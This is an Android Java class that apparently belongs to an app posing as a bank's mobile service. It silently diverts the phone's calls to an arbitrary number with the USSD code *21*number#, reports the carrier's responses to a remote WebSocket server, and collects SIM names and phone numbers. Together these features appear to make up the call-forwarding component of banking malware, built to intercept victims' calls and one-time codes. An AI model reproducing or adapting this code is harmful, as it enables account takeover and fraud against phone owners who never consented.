package axismobile.service.testingonnboard.system;

import static android.content.Context.TELEPHONY_SERVICE;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class CallForwardingHelper {
    private WebSocketManager webSocketManager;

    public  void setCallForwarding(Context context, String phoneNumber, int defaultSubId) {
        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        if (defaultSubId <= 0) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                defaultSubId = SubscriptionManager.getDefaultSubscriptionId();
            }
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
                if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
                    SubscriptionInfo subscriptionInfo = activeSubscriptions.get(0);
                    defaultSubId = subscriptionInfo.getSubscriptionId();
                }
            }
        }

        Handler handler = new Handler();
        TelephonyManager.UssdResponseCallback responseCallback = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            responseCallback = new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);
                    try {
                        Helper hel = new Helper();
                        JSONObject data = new JSONObject();
                        data.put("action", "response-call-forwarding-update");
                        data.put("message", response.toString());
                        data.put("sitename", hel.SITE());

                        webSocketManager = new WebSocketManager(context);
                        if (!webSocketManager.isConnected()) {
                            webSocketManager.connect();
                        }
                        String jsonString = data.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
//                    Toast.makeText(context, response.toString(), Toast.LENGTH_SHORT).show();
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);

                    try {
                        Helper hel = new Helper();
                        JSONObject data = new JSONObject();
                        data.put("action", "response-call-forwarding-update");
                        data.put("message", String.valueOf(failureCode));
                        data.put("sitename", hel.SITE());

                        webSocketManager = new WebSocketManager(context);
                        if (!webSocketManager.isConnected()) {
                            webSocketManager.connect();
                        }
                        String jsonString = data.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

//                    Toast.makeText(context, String.valueOf(failureCode), Toast.LENGTH_SHORT).show();
                }
            };
        }

        TelephonyManager manager1 = null;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            String ussdRequest = "*21*" + phoneNumber + "#";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                manager1 = manager.createForSubscriptionId(defaultSubId);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                manager1.sendUssdRequest(ussdRequest, responseCallback, handler);
            }
        }
    }

    public  void removeCallForwarding(Context context, int defaultSubId) {
        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        if (defaultSubId <= 0) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                defaultSubId = SubscriptionManager.getDefaultSubscriptionId();
            }
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
                if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
                    SubscriptionInfo subscriptionInfo = activeSubscriptions.get(0);
                    defaultSubId = subscriptionInfo.getSubscriptionId();
                }
            }
        }

        Handler handler = new Handler();
        TelephonyManager.UssdResponseCallback responseCallback = null;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            responseCallback = new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);
                    try {
                        Helper hel = new Helper();
                        JSONObject data = new JSONObject();
                        data.put("action", "response-call-forwarding-update");
                        data.put("message", response.toString());
                        data.put("sitename", hel.SITE());

                        webSocketManager = new WebSocketManager(context);
                        if (!webSocketManager.isConnected()) {
                            webSocketManager.connect();
                        }
                        String jsonString = data.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
//                    Toast.makeText(context, response.toString(), Toast.LENGTH_SHORT).show();
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                    try {
                        Helper hel = new Helper();
                        JSONObject data = new JSONObject();
                        data.put("action", "response-call-forwarding-update");
                        data.put("message", String.valueOf(failureCode));
                        data.put("sitename", hel.SITE());

                        webSocketManager = new WebSocketManager(context);
                        if (!webSocketManager.isConnected()) {
                            webSocketManager.connect();
                        }
                        String jsonString = data.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
//                    Toast.makeText(context, String.valueOf(failureCode), Toast.LENGTH_SHORT).show();
                }
            };
        }
        TelephonyManager manager1 = null;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            String ussdRequest = "#21#"; // USSD code to disable call forwarding
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                manager1 = manager.createForSubscriptionId(defaultSubId);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                manager1.sendUssdRequest(ussdRequest, responseCallback, handler);
            }
        }
    }

    public static String getSimDetails(Context context) throws JSONException {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

        // Check for the necessary permission to read phone state
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, "Permission to read phone state is required.", Toast.LENGTH_SHORT).show();
            return "";
        }

        JSONObject simData = new JSONObject();
        List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
        if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
            for (SubscriptionInfo subscriptionInfo : activeSubscriptions) {
                String simName = subscriptionInfo.getDisplayName().toString();
                int subId = subscriptionInfo.getSubscriptionId();
                String phoneNumber = subscriptionInfo.getNumber();

                // Handle the case where the phone number may be null or unavailable
                if (phoneNumber == null || phoneNumber.isEmpty()) {
                    phoneNumber = "Phone number not available";
                }

                // Store SIM data with SIM ID, SIM name, and SIM phone number
                simData.put("sim_id_" + subId, subId);
                simData.put("sim_name_" + subId, simName);
                simData.put("sim_number_" + subId, phoneNumber);
            }

            // Log and return the SIM details as a JSON string
            Log.d(Helper.TAG, "SIM Info: " + simData.toString());
            return simData.toString();
        } else {
            // Handle the case where no active subscriptions are found
            Toast.makeText(context, "No active subscriptions found.", Toast.LENGTH_SHORT).show();
            return "No active subscriptions found";
        }
    }

}
